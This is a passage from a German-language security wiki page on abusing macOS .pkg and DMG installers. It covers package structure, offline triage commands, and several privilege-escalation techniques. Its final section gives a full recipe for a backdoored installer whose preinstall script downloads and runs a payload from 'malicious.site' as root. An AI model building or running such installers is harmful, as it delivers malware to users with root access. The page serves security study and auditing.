# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg Basic Information

Ein macOS **installer package** (auch als `.pkg`-Datei bekannt) ist ein Dateiformat, das von macOS verwendet wird, um Software zu **verteilen**. Diese Dateien sind wie eine **Box, die alles enthält, was eine Software** braucht, um korrekt installiert zu werden und zu laufen.

Die Paketdatei selbst ist ein Archiv, das eine **Hierarchie von Dateien und Verzeichnissen enthält, die auf dem Zielcomputer installiert werden**. Sie kann auch **Skripte** enthalten, um Aufgaben vor und nach der Installation auszuführen, etwa das Einrichten von Konfigurationsdateien oder das Aufräumen alter Versionen der Software.

### Hierarchy

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Anpassungen (Titel, Begrüßungstext…) und Script-/Installationsprüfungen
- **PackageInfo (xml)**: Info, Installationsanforderungen, Installationsort, Pfade zu auszuführenden Skripten
- **Bill of materials (bom)**: Liste der zu installierenden, zu aktualisierenden oder zu entfernenden Dateien mit Dateiberechtigungen
- **Payload (CPIO archive gzip compressed)**: Dateien, die im `install-location` aus PackageInfo installiert werden
- **Scripts (CPIO archive gzip compressed)**: Pre- und Post-Install-Skripte und weitere Ressourcen, die zur Ausführung in ein temporäres Verzeichnis extrahiert werden.

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Um den Inhalt des Installers zu visualisieren, ohne ihn manuell zu dekomprimieren, kannst du auch das kostenlose Tool [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/) verwenden.

### Static triage shortcuts

Wenn das Ziel die Analyse ist, versuche, das Paket zuerst **nicht mit `Installer.app` zu öffnen**. Einige Pakete können Code ausführen, sobald Installer sie öffnet (zum Beispiel über `system.run()` oder installer plug-ins), daher ist die Offline-Extraktion normalerweise der sicherere Startpunkt.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## DMG Basic Information

DMG files, or Apple Disk Images, sind ein Dateiformat, das von Apples macOS für Disk Images verwendet wird. Eine DMG-Datei ist im Wesentlichen ein **mountable disk image** (sie enthält ein eigenes Filesystem), das Roh-Blockdaten enthält, die typischerweise komprimiert und manchmal verschlüsselt sind. Wenn du eine DMG-Datei öffnest, **mountet** macOS sie so, als wäre sie eine physische Festplatte, wodurch du auf ihren Inhalt zugreifen kannst.

> [!CAUTION]
> Beachte, dass **`.dmg`**-Installer **so viele Formate** unterstützen, dass in der Vergangenheit einige davon, die Schwachstellen enthielten, missbraucht wurden, um **kernel code execution** zu erlangen.

### Hierarchy

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

Die Hierarchy einer DMG-Datei kann je nach Inhalt unterschiedlich sein. Bei application DMGs folgt sie jedoch normalerweise dieser Struktur:

- Top Level: Das ist das Root des disk image. Es enthält oft die Anwendung und möglicherweise einen Link zum Applications-Ordner.
- Application (.app): Das ist die eigentliche Anwendung. In macOS ist eine Anwendung typischerweise ein Package, das viele einzelne Dateien und Ordner enthält, aus denen die Anwendung besteht.
- Applications Link: Das ist eine Verknüpfung zum Applications-Ordner in macOS. Der Zweck davon ist, die Installation der Anwendung zu erleichtern. Du kannst die .app-Datei auf diese Verknüpfung ziehen, um die App zu installieren.

## Privesc via pkg abuse

### Execution from public directories

Wenn ein Pre- oder Post-Installation-Skript zum Beispiel aus **`/var/tmp/Installerutil`** ausgeführt wird und ein Angreifer dieses Skript kontrollieren kann, kann er bei jeder Ausführung Privilegien eskalieren. Oder ein ähnliches Beispiel:

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Dies ist eine [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg), die mehrere Installer und Updater aufrufen, um **etwas als root auszuführen**. Diese Funktion akzeptiert den **path** der **Datei**, die ausgeführt werden soll, als Parameter. Wenn ein Angreifer diese Datei jedoch **ändern** kann, kann er ihre Ausführung mit root **missbrauchen**, um **Privilegien zu eskalieren**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Für weitere Informationen schau dir diesen Talk an: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Environment and shebang abuse

Moderne PackageKit-Bugs haben gezeigt, dass installer scripts oft als **trusted root code** ausgeführt werden, während sie gleichzeitig attacker-controlled context in der Nähe behalten. Beim Auditing von vendor packages solltest du besonders auf Folgendes achten:

- Shell interpreters wie `#!/bin/zsh` / `#!/bin/bash`
- Aufrufe wie `sudo -u $USER`, `launchctl asuser` oder jede Logik, die `$USER`, `$HOME`, `PATH`, `TMPDIR` oder relative paths vertraut
- Non-shell interpreters, die möglicherweise user-controlled init files oder libraries laden
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
Für den 2024 PackageKit root-environment-Bug (`~/.zshenv` / `~/.bash*` Vererbung während vom Benutzer gestarteter Installationen) schau auf die [generic macOS privesc page](../macos-privilege-escalation.md). Wenn das Paket **Apple-signed** ist, kann derselbe Script-Bug **SIP/TCC-relevant** werden, weil `system_installd` möglicherweise `com.apple.rootless.install.heritable` trägt; siehe [die SIP-Seite](../macos-security-protections/macos-sip.md).

### Execution by mounting

Wenn ein Installer nach `/tmp/fixedname/bla/bla` schreibt, ist es möglich, einen **mount** über `/tmp/fixedname` mit noowners zu erstellen, sodass du **jede Datei während der Installation ändern** kannst, um den Installationsprozess zu missbrauchen.

Ein Beispiel dafür ist **CVE-2021-26089**, das es schaffte, ein **periodic script zu überschreiben**, um Ausführung als root zu erhalten. Für weitere Informationen sieh dir den Talk an: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg as malware

### Empty Payload

Es ist möglich, einfach eine **`.pkg`**-Datei mit **pre- und post-install scripts** zu erzeugen, ohne echte Payload, abgesehen von der Malware innerhalb der Scripts.

### JS in Distribution xml

Es ist möglich, **`<script>`**-Tags in die **distribution xml**-Datei des Pakets einzufügen, und dieser Code wird ausgeführt; er kann mit **`system.run`** Befehle ausführen:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

Bei Distribution-Paketen hängt das normalerweise davon ab, dass die `Distribution`-Datei auf oberster Ebene externe Scripts aktiviert, zum Beispiel mit `allow-external-scripts="true"`. Daher reicht es nicht aus, nur `preinstall` / `postinstall` zu prüfen: Die **Distribution XML selbst** kann `installation-check` / `volume-check` Hooks und direkte `system.run()` / `system.runOnce()` Ausführungspfade enthalten.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Hintertüriger Installer

Malicious installer using a script and JS code inside dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [**DEF CON 27 - Unpacking Pkgs A Look Inside Macos Installer Packages And Common Security Flaws**](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [**OBTS v4.0: "The Wild World of macOS Installers" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [**DEF CON 27 - Unpacking Pkgs A Look Inside MacOS Installer Packages**](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [**CVE-2024-27822: macOS PackageKit Privilege Escalation**](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [**Breaking SIP with Apple-signed Packages**](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)

{{#include ../../../banners/hacktricks-training.md}}
